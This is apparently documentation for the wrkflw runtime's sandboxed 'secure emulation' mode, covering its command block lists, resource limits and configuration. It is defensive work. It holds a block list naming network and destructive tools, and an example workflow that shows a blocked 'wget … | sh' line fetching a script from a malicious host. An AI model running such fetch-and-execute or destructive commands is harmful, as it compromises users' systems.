# Security Features in wrkflw Runtime

This document describes the security features implemented in the wrkflw runtime, particularly the sandboxing capabilities for emulation mode.

## Overview

The wrkflw runtime provides multiple execution modes with varying levels of security:

1. **Docker Mode** - Uses Docker containers for isolation (recommended for production)
2. **Secure Emulation Mode** - 🔒 **NEW**: Sandboxed execution on the host system
3. **Emulation Mode** - ⚠️ **UNSAFE**: Direct execution on the host system (deprecated)

## Security Modes

### 🔒 Secure Emulation Mode (Recommended for Local Development)

The secure emulation mode provides comprehensive sandboxing to protect your system from potentially harmful commands while still allowing legitimate workflow operations.

#### Features

- **Command Validation**: Blocks dangerous commands like `rm -rf /`, `dd`, `sudo`, etc.
- **Pattern Detection**: Uses regex patterns to detect dangerous command combinations
- **Resource Limits**: Enforces CPU, memory, and execution time limits
- **Filesystem Isolation**: Restricts file access to allowed paths only
- **Environment Sanitization**: Filters dangerous environment variables
- **Process Monitoring**: Tracks and limits spawned processes

#### Usage

```bash
# Use secure emulation mode (recommended)
wrkflw run --runtime secure-emulation .github/workflows/build.yml

# Or via TUI
wrkflw tui --runtime secure-emulation
```

#### Command Whitelist/Blacklist

**Allowed Commands (Safe):**
- Basic utilities: `echo`, `cat`, `ls`, `grep`, `sed`, `awk`
- Development tools: `cargo`, `npm`, `python`, `git`, `node`
- Build tools: `make`, `cmake`, `javac`, `dotnet`

**Blocked Commands (Dangerous):**
- System modification: `rm`, `dd`, `mkfs`, `mount`, `sudo`
- Network tools: `wget`, `curl`, `ssh`, `nc`
- Process control: `kill`, `killall`, `systemctl`

#### Resource Limits

```rust
// Default configuration
SandboxConfig {
    max_execution_time: Duration::from_secs(300),  // 5 minutes
    max_memory_mb: 512,                            // 512 MB
    max_cpu_percent: 80,                           // 80% CPU
    max_processes: 10,                             // Max 10 processes
    allow_network: false,                          // No network access
    strict_mode: true,                             // Whitelist-only mode
}
```

### ⚠️ Legacy Emulation Mode (Unsafe)

The original emulation mode executes commands directly on the host system without any sandboxing. **This mode will be deprecated and should only be used for trusted workflows.**

```bash
# Legacy unsafe mode (not recommended)
wrkflw run --runtime emulation .github/workflows/build.yml
```

## Example: Blocked vs Allowed Commands

### ❌ Blocked Commands

```yaml
# This workflow will be blocked in secure emulation mode
steps:
  - name: Dangerous command
    run: rm -rf /tmp/*  # BLOCKED: Dangerous file deletion

  - name: System modification
    run: sudo apt-get install package  # BLOCKED: sudo usage

  - name: Network access
    run: wget https://malicious-site.com/script.sh | sh  # BLOCKED: wget + shell execution
```

### ✅ Allowed Commands

```yaml
# This workflow will run successfully in secure emulation mode
steps:
  - name: Build project
    run: cargo build --release  # ALLOWED: Development tool

  - name: Run tests
    run: cargo test  # ALLOWED: Testing

  - name: List files
    run: ls -la target/  # ALLOWED: Safe file listing

  - name: Format code
    run: cargo fmt --check  # ALLOWED: Code formatting
```

## Security Warnings and Messages

When dangerous commands are detected, wrkflw provides clear security messages:

```
🚫 SECURITY BLOCK: Command 'rm' is not allowed in secure emulation mode.
This command was blocked for security reasons.
If you need to run this command, please use Docker mode instead.
```

```
🚫 SECURITY BLOCK: Dangerous command pattern detected: 'rm -rf /'.
This command was blocked because it matches a known dangerous pattern.
Please review your workflow for potentially harmful commands.
```

## Configuration Examples

### Workflow-Friendly Configuration

```rust
use wrkflw_runtime::sandbox::create_workflow_sandbox_config;

let config = create_workflow_sandbox_config();
// - Allows network access for package downloads
// - Higher resource limits for CI/CD workloads
// - Less strict mode for development flexibility
```

### Strict Security Configuration

```rust
use wrkflw_runtime::sandbox::create_strict_sandbox_config;

let config = create_strict_sandbox_config();
// - No network access
// - Very limited command set
// - Low resource limits
// - Strict whitelist-only mode
```

### Custom Configuration

```rust
use wrkflw_runtime::sandbox::{SandboxConfig, Sandbox};
use std::collections::HashSet;
use std::path::PathBuf;

let mut config = SandboxConfig::default();

// Custom allowed commands
config.allowed_commands = ["echo", "ls", "cargo"]
    .iter()
    .map(|s| s.to_string())
    .collect();

// Custom resource limits
config.max_execution_time = Duration::from_secs(60);
config.max_memory_mb = 256;

// Custom allowed paths
config.allowed_write_paths.insert(PathBuf::from("./target"));
config.allowed_read_paths.insert(PathBuf::from("./src"));

let sandbox = Sandbox::new(config)?;
```

## Migration Guide

### From Unsafe Emulation to Secure Emulation

1. **Change Runtime Flag**:
   ```bash
   # Old (unsafe)
   wrkflw run --runtime emulation workflow.yml
   
   # New (secure)
   wrkflw run --runtime secure-emulation workflow.yml
   ```

2. **Review Workflow Commands**: Check for any commands that might be blocked and adjust if necessary.

3. **Handle Security Blocks**: If legitimate commands are blocked, consider:
   - Using Docker mode for those specific workflows
   - Modifying the workflow to use allowed alternatives
   - Creating a custom sandbox configuration

### When to Use Each Mode

| Use Case | Recommended Mode | Reason |
|----------|------------------|---------|
| Local development | Secure Emulation | Good balance of security and convenience |
| Untrusted workflows | Docker | Maximum isolation |
| CI/CD pipelines | Docker | Consistent, reproducible environment |
| Testing workflows | Secure Emulation | Fast execution with safety |
| Trusted internal workflows | Secure Emulation | Sufficient security for known-safe code |

## Troubleshooting

### Command Blocked Error

If you encounter a security block:

1. **Check if the command is necessary**: Can you achieve the same result with an allowed command?
2. **Use container mode**: Switch to Docker mode for unrestricted execution
3. **Modify the workflow**: Use safer alternatives where possible

### Resource Limit Exceeded

If your workflow hits resource limits:

1. **Optimize the workflow**: Reduce resource usage where possible
2. **Use custom configuration**: Increase limits for specific use cases
3. **Use container mode**: For resource-intensive workflows

### Path Access Denied

If file access is denied:

1. **Check allowed paths**: Ensure your workflow only accesses permitted directories
2. **Use relative paths**: Work within the project directory
3. **Use container mode**: For workflows requiring system-wide file access

## Best Practices

1. **Default to Secure Mode**: Use secure emulation mode by default for local development
2. **Test Workflows**: Always test workflows in secure mode before deploying
3. **Review Security Messages**: Pay attention to security blocks and warnings
4. **Use Containers for Production**: Use Docker for production deployments
5. **Regular Updates**: Keep wrkflw updated for the latest security improvements

## Security Considerations

- Secure emulation mode is designed to prevent **accidental** harmful commands, not to stop **determined** attackers
- For maximum security with untrusted code, always use container modes
- The sandbox is most effective against script errors and typos that could damage your system
- Always review workflows from untrusted sources before execution

## Contributing Security Improvements

If you find security issues or have suggestions for improvements:

1. **Report Security Issues**: Use responsible disclosure for security vulnerabilities
2. **Suggest Command Patterns**: Help improve dangerous pattern detection
3. **Test Edge Cases**: Help us identify bypass techniques
4. **Documentation**: Improve security documentation and examples

---

For more information, see the main [README.md](../../README.md) and [Security Policy](../../SECURITY.md).
